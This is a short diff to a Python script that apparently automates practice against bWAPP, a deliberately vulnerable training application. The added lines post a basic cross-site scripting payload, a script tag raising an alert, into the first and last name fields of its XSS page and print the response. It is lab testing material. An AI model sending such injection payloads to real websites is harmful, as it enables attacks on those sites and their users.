@@ -56,5 +56,17 @@ selectBugResponse = s.post(url_bugs, data=payload, headers= headers)
 #select the bug
 selectBugResponse.content
 
-
+#------------------------------------#
+#go to one xss bug page
+url_bugs = url_base + "/bWAPP/xss_post.php"
+#inject XSS script to fileds
+payload = {
+			"firstname":	'<script>alert("Oh!");</script>',
+			"form":	"submit",
+			"lastname":	'<script>alert("Oh!");</script>'
+			}
+#send a request to inject the passed values including script injection
+bugPageResponse = s.post(url_bugs, data=payload, headers= headers)
+#get response of the injection
+print(bugPageResponse.text)
 
